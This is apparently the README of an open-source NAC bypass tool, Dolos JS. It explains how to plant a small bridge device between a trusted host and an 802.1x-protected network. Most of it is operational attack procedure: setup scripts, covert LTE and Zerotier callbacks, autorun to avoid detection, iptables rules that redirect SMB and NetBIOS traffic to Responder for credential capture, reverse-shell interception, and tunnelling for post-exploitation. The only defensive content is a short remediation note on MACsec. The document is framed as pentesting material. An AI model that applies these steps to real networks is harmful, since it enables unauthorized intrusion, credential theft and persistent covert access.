# Dolos JS
#### AKA Dolos Cloak 2.0

This project is a full re-write of the NAC bypass technique implemented in the original [Dolos Cloak](https://github.com/fkasler/dolos_cloak) project. Major improvements include:

- Asynchronous packet sniffing implemented in Node.js
- Avoids python and python dependency hell altogether (NPM > PIP... imho)
- Leverages more protocols to automatically set up the attack. Original project just inspected DHCP, EPOL, and TTLs. Current project inspects ARP, DHCP, DNS, HTTP, FTP, NTP, Kerberos, and TTLs to determine the required information very quickly.
- New web interface for operators to check the status of the attack and make some config tweaks on the fly
- New management interface IP scheme that allows for callbacks like Zerotier over LTE WAN
- Wi-Fi, ETHERNET, and LTE config examples

### Hardware

#### Networking Stuff

In addition to the tool itself, you will need a spare Ethernet cable to run the attack. It's always a good idea to bring a few with you on assessments. I highly recommend buying a pack of "ultra thin" patch cables for this type of stuff. 

If you want to be able to run this attack using a trusted device that runs on Power Over Ethernet (think IP phone, etc.), then you will need a POE injector. It is also nice to have these around in your toolkit.

#### Management Interface

You will want a way to log into your attacking device, check on the attack, route traffic through it, and perform post-exploitation. There are several options available for this:

1. External USB Ethernet adapter like [this](https://www.amazon.com/Ethernet-Adapter-Hannord-Gigabit-Network/dp/B08ZHY26TP/ref=sr_1_14?) one. You will need to have physical access to the device to run post-exploitation with this method, so it is best suited for demonstrating NAC bypass as part of an internal penetration test. This management interface is not well suited for situations where you want to drop the box somewhere and leave.

2. Wi-Fi hostapd hotspot from an external Wi-Fi adapter like [this](https://thepihut.com/products/usb-wifi-adapter-for-the-raspberry-pi) one. You will need to stay close to the device, but at least you have the option of potentially leaving the room or even the building and performing post-exploitation from the outside. Keep in mind that some organizations may be monitoring for new or rouge Wi-Fi access points. Some defense products will even actively deauth new APs until they are approved.

3. LTE WAN adapter like [this](https://www.amazon.com/Huawei-E397Bu-501-LTE-USB-Dongle/product-reviews/B01M08WCOK) one, or [this](https://www.amazon.com/gp/product/B0769Z7WVQ) one. You will also need a SIM card and a SIM adapter like [this](https://www.amazon.com/iSYFIX-Card-Adapter-Nano-Micro/dp/B00R25GJJW/ref=pd_day0fbt_img_2/132-7758596-6842067) one. To get a suitable adapter, you will need to make sure it is "unlocked". In other words, a cellular modem that is not locked to any provider and is compatible with your chosen provider. The advantage of this setup is that you can manage the device remotely, from long distances, and without the need to send any traffic across the target's network perimeter.

4. Classic network callback methods like a reverse netcat shell, SSH, VPN, Zerotier, etc. No additional hardware required in this instance, but you run the risk of getting caught based on the traffic that traverses the target's network perimeter.

#### The Box

This project was designed to run on a [NanoPi R2S](https://wiki.friendlyarm.com/wiki/index.php/NanoPi_R2S). You will also need a micro SD card like [this](https://www.amazon.com/Silicon-Power-Speed-MicroSD-Adapter/dp/B07Q384TPK/ref=sr_1_4?) one to flash the OS. The choice of hardware was based on the fact the device is very small and has two built-in 10/100/1000M Ethernet ports. In theory, you can use this software on any Debian based system with at least 2 Ethernet ports, which brings us to...

### Operating System

The NanoPi R2S has two precompiled OS options:

- OpenWrt - Popular for small DIY routers, but lackluster packaging and lacks out-of-the-box support for some required networking utils
- UbuntuCore - Debian based with APT Package Manager. Easy to install Node.js, required networking utils, and other hacking tools. ✨WINNER✨

You can get a copy of the pre-built UbuntuCore OS from FriendlyARM's downloads [page](https://download.friendlyarm.com/nanopir2s). Select the Google Drive option, and download the latest "friedlycore" image. Then use [Etcher](https://www.balena.io/etcher/) to flash it to an SD card and you're all set to proceed with...

### Installation

The default creds for FriendlyCore are:

```
User Name: root
Password: fa
```

You will need to run the setup as root.

Plug it into your network with the WAN port. It should get a DHCP address, and expose port 22 for you to ssh in and configure it. From here, take the following steps to setup the Dolos JS project on the device:

#### First Login

```
hostnamectl set-hostname myhostname
mkdir .ssh tools tools/dolosjs
passwd
#paste in your public key for easy access
vim .ssh/authorized_keys
```

Also, keep in mind that there is a built-in "pi" user. I recommend changing the password on the "pi" account as well.

## The Next 3 Sections Cover Setup Instructions for Wifi/Ethernet OR LTE Cellular OR Network Based Callbacks. Skip to the Relevant Section:

#### Wi-Fi/Ethernet Management Setup

- SCP the Dolos JS project to the device
- CD to the 'setup' folder in the project
- Plug in your Wi-Fi dongle, or Ethernet Dongle
- Run the setup script for the desired management interface
- Test the management interface and then run finish\_setup.sh to lock the built-in NICs and complete the setup.

```
cd dolosjs
zip -r dolos.zip *
scp dolos.zip root@nanopi_ip_addr:
ssh root@nanopi_ip_addr
mv dolos.zip tools/dolosjs/
cd tools/dolosjs/
apt install unzip
unzip dolos.zip
rm dolos.zip
cd setup/wifi_mgmt/
bash setup.sh
```

Reboot the device and connect to your management interface to make sure you get an IP and you can ssh in:

```
ssh root@172.31.255.1
```

Test out the attack by starting the dolos\_service:

```
systemctl start dolos_service
tmux a #or screen -x
```

Finally, set the attack to autorun via the finish\_setup.sh script: 

##### Warning

**This will enable the dolos\_service and set the built-in NICs to 'manual', meaning you will only be able to manage the device from the management interface. If the management interface is not working, the device will be bricked.**

```
bash finish_setup.sh
```

#### LTE Management Setup

In addition to running the basic setup.sh script, you will need to make sure your USB modem is functioning properly before locking ourselves out of eth0 and eth1. The two key components we need to test are usb\_modeswitch and wvdial.

##### USB ModeSwitch

USB modems typically have two 'modes' as a USB device. The first mode is as a mass storage device, where the storage is mounted by the OS to install the driver for the modem. The second mode is as a wwan modem. On boot, udev will try to determine what type of device it is, based on a vendor and product ID, and follow some "rules" to trigger additional actions. If udev detects that the device is a USB modem, based on vendor/product ID, then it will call usb\_modeswtich to flip the device to the second mode. Under the hood, usb\_modeswitch just wraps a big collection of vendor:product ID pairs and their associated commands or "messages" to trigger the device to switch. If the usb\_modeswitch config has 'DisableSwitching=0', then it should attempt to switch your device, even if it is not in your udev ruleset. First, we need to make sure our USB device switches to modem mode reliably. Second, because we can end up in a race condition with our dolos\_service, which expects a modem at /dev/ttyUSB0, if this switching process takes too long, we want to manually configure the switch message for the device so usb\_switchmode does not have to figure this out. 

The setup script will copy an example usb\_modeswitch config to /etc/usb\_modeswitch.conf as well as an example usb\_modeswitch.d device config for a Huawei e397bu-501 modem to /etc/usb\_modeswitch.d/12d1:1505. You will need to rename the 12d1:1505 config to the vendor:product pair of your device. You will also need to modify the contents of the file to contain the vendor ID, product IDs, and switch message for your device. To get the right IDs and message, you can check the official [device\_reference.txt](https://www.draisberghof.de/usb_modeswitch/device_reference.txt), Google the usb\_modeswitch config for your exact device model, or use usb\_modeswitch logs and syslog to get the IDs and config.

If the device reference and Google are not helpful, you can enable usb\_switchmode logging by modifying /etc/usb\_modeswitch.conf and setting 'EnableLogging=1'. You should then re-insert the USB modem and you should see logs in /var/log/usb\_modeswitch.log. In the case of the Huawei e397bu-501, usb\_switchmode took several seconds to automatically switch the device, but the logs contained a working config to copy to /etc/usb\_modeswitch.d/12d1:1505. 

Example from the /var/log/usb\_modeswitch.log:

```
 ! PLEASE REPORT NEW CONFIGURATIONS !

DefaultVendor=  0x12d1
DefaultProduct= 0x1505
TargetVendor=   0x12d1
TargetProductList="140b,140c,1506,150f,150a"
HuaweiNewMode=1
```
In this example, the device first shows up as the mass storage device 12d1:1505, and then is switched to the modem mode as 12d1:1506.

If usb\_modeswitch fails to automatically configure your modem, it may at least give you the vendor:product pairs to go back to Google and look for a working config. If usb\_modeswitch does not even get the vendor:product pair, you can look in /var/log/syslog and search for USB. Here is an example from plugging in the Huawei e397bu-501:

```
Oct  3 17:03:41 nanocloak kernel: [    3.623099] usb 2-1: New USB device found, idVendor=12d1, idProduct=1505, bcdDevice= 0.00
Oct  3 17:03:41 nanocloak kernel: [    3.623996] usb 2-1: New USB device strings: Mfr=3, Product=2, SerialNumber=0
Oct  3 17:03:41 nanocloak kernel: [    3.624634] usb 2-1: Product: HUAWEI Mobile
Oct  3 17:03:41 nanocloak kernel: [    3.625008] usb 2-1: Manufacturer: Huawei Technologies
Oct  3 17:03:41 nanocloak kernel: [    3.627518] usb 5-1: new SuperSpeed Gen 1 USB device number 2 using xhci-hcd
Oct  3 17:03:41 nanocloak kernel: [    3.628594] usb-storage 2-1:1.0: USB Mass Storage device detected
Oct  3 17:03:41 nanocloak kernel: [    3.630808] scsi host0: usb-storage 2-1:1.0
```

You can also use lsusb to get vendor:product IDs:

```
apt install usbutils
lsusb
```

To test your config, you can temporariy set 'DisableSwitching=1' in /etc/usb\_modeswitch.conf to stop usb\_switchmode from automatically switching the device for us. The device should remain in mass storage mode and no wwan0 should appear until you manually trigger it:

```
/usr/sbin/usb_modeswitch -c /etc/usb_modeswitch.d/12d1:1505 -v 12d1 -p 1505
```

If the config is correct, the device should now be switched and 'ip a' should show a wwan0 interface. You can set 'DisableSwitching=0' back once you have a working config. Finally, you may need to add an entry in your udev rules to properly pass your vendor:product pair to usb\_switchmode:

For example, I had to modify /lib/udev/rules.d/40-usb\_modeswitch.rules and add the following line near the top:

```
ATTRS{idVendor}=="12d1", ATTRS{idProduct}=="1505", RUN+="usb_modeswitch '%b/%k'"
``` 

##### Wvdial

Wvdial is used to connect your USB modem to your service provider's network. The dialup initialization command set and other parameters will vary depending on your provider. You need to look up the AT command sequence for your USB modem. The setup.sh script adds an axample config in /etc/wvdial.conf for a Verizon SIM card:

```
[Dialer Verizon]

Init1 = ATZ
Init2 = ATQ0 V1 E1 S0=0 &C1 &D2 +FCLASS=0
Init3 = AT+CGDCONT=1,"IP","vzwinternet"
Stupid Mode = 1
Modem Type = Analog Modem
ISDN = 0
Phone = *99#
Modem = /dev/ttyUSB0
Username = {blank}
Password = {blank}
Baud = 9600
New PPPD = yes
```

Note, that the "Dialer Verizon" gives this config block an alias of "Verizon" so we can call it in dolos\_service like:

```
wvdial Verizon >>/var/log/wvdial.log 2>&1 & 
```

If you change the alias, also change it in dolos\_service.

"vzwinternet" is the Access Point Name, or APN of the provider. Some providers have multiple that you might need to test out. You may also need to modify some of the other "AT" modem commands if you go with a different provider. Unfortunately, this can take a bit of trial and error to get right. It may be helpful to connect the modem to a headful Debian device, like a Kali or Ubuntu VM, and play with the settings in the networking GUI. Good Luck!

##### Shoutout

Much thanks to Joff Thyer and his [blog](https://www.blackhillsinfosec.com/pentesting-dropbox-on-steroids/) on this topic. It provided several missing pieces of the puzzle for LTE callback setup.

##### Callback

You will want the device to call home once it gets a WAN connection. To do this, modify /etc/ppp/ip-up.d/dolos\_callback and replace it with a callback of your choice. The example shows how simple it is to join a Zerotier network as a callback. You could also initiate a reverse shell, reverse SSH tunnel, VPN callback, etc. 

The project is designed to expect a management subdomain of 172.31.255.0/24. To make live easy as an operator, it is best to set up a OpenVPN or Zerotier network in that range. That way, your Dolos device and laptop will both recieve an IP in that range, and you just need to set up a few routes and DNS settings on your laptop/VM to access the target network for post-exploitation.

Finally, set the attack to autorun via the finish\_setup.sh script: 

##### Warning

This will enable the dolos\_service and set the built-in NICs to 'manual', meaning you will only be able to manage the device from the management interface. If the management interface is not working, the device will be bricked. 

```
bash finish_setup.sh
```

#### Network Callback Setup

For a basic network callback, you can modify the config.js file in the base of the dolosjs project and set:

```
config.replace_default_route = true
config.run_command_on_success = true
config.autorun_command = 'mycallbackoneliner args'
```

This will allow the device to send outbound Internet traffic once the MitM attack has succeeded, instruct the script to run a command when the device is able to spoof the trusted device, and specifies a command to run. Openvpn, Zerotier, and ssh are some simple callback options. It's not a bad idea to trigger some callbacks from crontab in case you lose your initial shell. 

Finally, set the attack to autorun via the finish\_setup.sh script: 

##### Warning

This will enable the dolos\_service and set the built-in NICs to 'manual', meaning you will only be able to manage the device from the management interface. If the management interface is not working, the device will be bricked. 

```
bash finish_setup.sh
```

Okay, now it's time to...

### Attack

To bypass NAC using this tool, you will need to place it between a trusted network device (workstation, printer, IP phone, etc.) and the network. If you did not set the script to autorun, then you will get burned the moment you plug it into the network. Make sure to ssh into it first and manually kick off the script before proceeding with the man-in-the-middle attack. If the script is set to autorun, then power on the NanoPi, wait a few moments for it to boot up, and then plug it between the trusted device and the network. In other words, unplug the trusted device's network cable from the device, use a spare Ethernet cable to plug the trusted device into your NanoPi, then plug the original Ethernet cable (that was previously providing network access to the trusted device) into the other port on your NanoPi. Which cable to which port does not matter. The tool was designed to 🪄automagically🔮 figure this out. Which side, trusted device or network, you plug into the NanoPi first also typically won't matter if they are plugged in within a few seconds of each other, so don't over think it. Does the NanoPi have one Ethernet cable going to the trusted device and the other going to the wall/switch/trunking IP phone/etc.? Then you did it right.

The tool is designed to run with the following command:

```node dolos.js```

If you set the script to autorun, then you will not see all the verbose console output of the script, but don't worry; that's why we expose a web UI. Once you are connected to the management interface, you can ssh into the device, port forward your local 4444 to its local 4444, open a browser, and navigate to:

```
ssh root@172.31.255.1 -L 4444:127.0.0.1:4444
```
[http://localhost:4444/](http://172.31.255.1:4444/)

Check to make sure the device was able to autoconfig the attack, test your management interface/callback really quick, and get out of there!

### Post-Exploitation

It may be tempting to just treat the NanoPi like a classic pentest dropbox. That is, install a bunch of tools on it, ssh in, and launch attacks from the device itself. However, a much more flexible approach is to think of the device as a router. You connect to the device from a laptop/VM, set up a few network configs on your computer to route traffic through the device, and launch attacks from your own system. Things get slightly more complicated when you want to capture traffic streams that you did not initiate, like running NTLM capture/relay attacks or getting reverse shells. Here are a few common scenarios and networking tricks to perform various actions:

#### Routing through Wi-Fi or Ethernet Management Interface

Because the Dolos device issues attached devices an IP in the 172.31.255.0/24 range via DHCP, you can essentially treat it like a switch. The only additional information you will need is the DNS settings for the network. You will just need to modify your /etc/resolv.conf in order to start routing traffic directly from your device. There is a button in the web UI to copy the correct settings to your clipboard. You can also just manually match your resolv.conf to the one on the Dolos device.

You may run into issues if you have any other network interfaces up. Make sure that the default route from your laptop/VM is directing traffic through the Dolos IP (172.31.255.1).

#### Routing through VPN or Zerotier Callbacks

The tool is designed to automatically route any traffic in the reserved ranges 10.0.0.0/8, 192.168.0.0/16, and 172.16.0.0/12 to the attacking bridge interface and onto the internal target network with the exception of 172.16.255.0/24, which is used to create a management subnet for the attack. You should use the 172.16.255.0/24 as the network range for your VPN or Zerotier config so that the Dolos device receives an IP in this range when it calls home. Then, when you connect your laptop/VM to the same VPN/Zerotier network, it will also receive an address in this range and be able to reach the Dolos device and use it to route traffic to other reserved ranges. For example:

Your Eth0:	192.168.1.5/24

Your Tun0:	172.31.255.3

Dolos Tun0:	172.31.255.2

Target Range:	10.100.0.0/16

Target DNS:	10.100.100.53

You ssh into root@172.31.255.2, check the attack, and identify that the target network is utilizing the 10.100.0.0/16 range. To start interacting with the target range from your device, run:

```
ip route add 10.100.0.0/16 via 172.31.255.2 dev tun0
```

You can then add 'server 10.100.100.53' to your /etc/resolv.conf and your laptop/VM will have access 10.100.0.0/16 subnet.

##### WARNING:

If the target network is using the same range as your default route, you may drop your own network connection. In this example, if your target network was also using 192.168.1.0/24, you would want to connect your Eth0 to some other network that is not using this range before proceeding.

#### Give the Dolos Device Internet Access

By default, the tool does not set the bridge interface as the default route. This is to avoid creating traffic that will traverse the network perimeter where it may be inspected by the firewall. To allow outbound Internet traffic from the bridge, set it as the default route. There is a button in the web UI to do this. You can also run the following commands manually:

```
#delete any existing default route. This may error out. Don't worry if it does
ip route del default
ip route add default via 169.254.66.55 dev mibr
```

#### Packet Capture / Relay

Because of the NAT, you will not be able to just bind an interface/port and start mangling traffic. You will need to add iptables rules to let the Dolos device know which protocols you want to take control of. For example, if you want to use Responder.py to spoof NetBIOS and capture SMB authentication requests, you would need the following iptables rules:

```
#Any NetBIOS Name Resolution request
/sbin/iptables -t nat -A PREROUTING -i mibr -p tcp --dport 137 -j DNAT --to 169.254.66.77:137
/sbin/iptables -t nat -A PREROUTING -i mibr -p udp --dport 137 -j DNAT --to 169.254.66.77:137
#Any NetBIOS session packet
/sbin/iptables -t nat -A PREROUTING -i mibr -p tcp --dport 139 -j DNAT --to 169.254.66.77:139
/sbin/iptables -t nat -A PREROUTING -i mibr -p udp --dport 138 -j DNAT --to 169.254.66.77:138
#Any SMB packet
/sbin/iptables -t nat -A PREROUTING -i mibr -p tcp --dport 445 -j DNAT --to 169.254.66.77:445
/sbin/iptables -t nat -A PREROUTING -i mibr -p udp --dport 445 -j DNAT --to 169.254.66.77:445
```

You can then run Responder.py on the bridge interface:

```
Responder.py -I mibr
```

This works by redirecting the traffic we want directly to the virtual IP of the bridge interface itself (169.254.66.77)

To make Responder.py more useful, you will want to add rules like these for all the protocols you want to manipulate.

You can also send these packets to your laptop/VM to run the attack. Simply modify the --to flag to point to your laptop/VM 172.31.255.X IP instead of 169.254.66.77.

##### WARNING:

Do not FLUSH your iptables rules when you are done! We need the other rules set up during the attack to keep us undetected. Instead, individually delete rules like this:

```
/sbin/iptables -t nat -D PREROUTING -i mibr -p tcp --dport 137 -j DNAT --to 169.254.66.77:137
```

It's basically the same rule but with a 'D' flag to delete instead of an 'A' flag to add.

##### WARNING:

Some NAC products use agents on endpoints to periodically authenticate them. These agents may be running on common ports like 80, 443, 8080, etc. If you capture those packets instead of letting them traverse the NAT, you could get burned. Therefore, it is recommended that you do not perform packet capture or relay attacks for extended periods of time.

#### Reverse Shells

Similar to the packet capture and relay attack setup, you can add an iptables rule to capture reverse shell traffic. Let's say your laptop/VM has the Dolos management network address 172.31.255.3 and you have a classic Metasploit HTTPS listener binding port 4444. To get shells, redirect traffic destined for TCP 4444 back to your host:

```
/sbin/iptables -t nat -A PREROUTING -i mibr -p tcp --dport 4444 -j DNAT --to 172.31.255.3:4444
```

Q: But what do I set as LHOST?
A: The IP of the trusted device that you hijacked the network connection from! That's the location other devices on the network can use to send packets your way.

You *could* also bind a port on the bridge interface and send the traffic to 169.254.66.77 if you wanted to get the shell back directly to the Dolos device. But again, it is generally better to treat the attacking device like a router instead.

#### Snapback

Snapback is pretty resource intensive and will likely not perform well, if at all, running on the NanoPi hardware. Instead, run Snapback on your laptop/VM, set up a SOCKS5 proxy through your Dolos device and add the proxy as a setting in you Snapback UI:

```
ssh -D 8080 root@172.31.255.1
```

The proxy setting should then be:

```
socks5://localhost:8080
```

#### RDP

To RDP to a device on the target network, simply set up port forwarding and RDP to your localhost:

```
ssh -L 3389:target.host.ip.addr:3389 root@172.31.255.1 
```

Then RDP to your localhost and the traffic will be routed to your target host through the SSH tunnel.

#### FTP

Filezilla and other FTP clients support SOCKS5 proxies. Set up a proxy on port 8080 with the following command:

```
ssh -D 8080 root@172.31.255.1
```

### How it Works

This tool is loosely based on a technique pioneered by Alva 'Skip' Duckwall in his DefCon19 talk "A Bridge Too Far: Defeating Wired 802.1x". It also uses elements from projects like [SlimShim](https://github.com/mtkirby/slimshim), [BitM](https://github.com/warpnet/BitM), and [Lauschgeraet](https://github.com/SySS-Research/Lauschgeraet) as well as some new routing tricks I discovered along the way. The basic technique leveraged by all these tools is the use of a transparent bridge interface to set up a man-in-the-midddle attack against a trusted network device and allow the device to answer any 802.1x authentication for us. In an 802.1x environment, when a switch detects that a device has plugged into a switch port, it changes the state of the switch port from 'disable' to 'unauthorized' and initiates EAP authentication between the newly connected device (supplicant) and the authentication server (RADIUS server). If the device is able to successfully authenticate, the switch port is placed in an 'authorized' state, the port stays open, and subsequent traffic is allowed for the configured lease time. When the lease is up, the supplicant must re-authenticate even if the switch port did not change state. By connecting two network interfaces together on a virtual bridge, we can allow EAP traffic to traverse the bridge and force a trusted network device to perform the authentication step for us. However, we also need to be careful about exposing the MAC addresses of our network interfaces. If the 802.1x solution identifies an unauthorized MAC, it will likely block or even disable the port. In some cases, traffic from the switch port will be logically transferred to a segmented or even honeypot VLAN when malicious activity is identified.

As long as subsequent network traffic appears to originate from the authenticated device, we can maintain access to the network. To do that, the tool first utilizes ebtables and iptables rules to block any OUTPUT traffic originating from the attacking device. This ensures that we do not get burned by accidentally leaking our interfaces' MAC addresses. It then sets up the bridge interface to facilitate the MitM attack and waits for the trusted device to authenticate over EAP and start sending normal network traffic. By listening to the traffic on the bridge, the tool then identifies the MAC and IP of the trusted device, as well as the MAC of the default gateway. With this information, the attacking device can now spoof the trusted network device to the switch and route traffic elsewhere in the network. The tool utilizes ebtables and iptables POSTROUTING NAT rules to spoof the MAC and IP of the trusted device on every packet that originates from the attacking device and starts allowing OUTPUT traffic. Because the MAC and IP match the trusted device, the NAT keeps track of ephemeral ports to correctly route traffic back to the correct host. In this way, the trusted device and the attacking device both maintain network access without interference.

### Remediation
In theory, there is this thing called "IEEE 802.1AE", per Wikipedia:

*(also known as MACsec) is a network security standard that operates at the medium access control layer and defines connectionless data confidentiality and integrity for media access independent protocols. It is standardized by the IEEE 802.1 working group.*

But hardly any devices support it as of 2022, so it's unlikely to run into this control. It is also likely too cost prohibitive for most organizations to implement and comes with a significant decrease in network speeds. Finally, even orgs that do implement it are likely to have to live with gaps in the control because of devices like printers, etc. that must be on the network but do not support MACsec. 

## License

MIT

**Hack the planet, pwn n00bs, have fun :)**
